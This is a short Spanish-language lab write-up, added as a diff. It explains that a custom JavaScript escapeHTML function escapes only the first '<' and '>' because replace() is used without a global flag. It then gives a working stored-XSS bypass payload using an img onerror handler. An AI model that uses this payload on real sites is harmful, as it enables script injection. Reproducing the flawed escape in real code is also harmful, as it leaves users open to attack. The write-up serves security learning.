@@ -1,0 +1,17 @@
+primero que nada al revisar la funcion de javascript que tiene un custom escape
+
+loadCommentsWithVulnerableEscapeHtml.js
+
+nos damos cuenta que la funcion de escape
+
+    function escapeHTML(html) {
+        return html.replace('<', '&lt;').replace('>', '&gt;');
+    }
+
+es vulnerable pq solo elimina la primera aparicion de ambos
+
+por lo que para bypasear esto e imprimir lo que sea tenemos que hacer
+
+<><img src=x onerror=alert(1)>
+
+y listo 
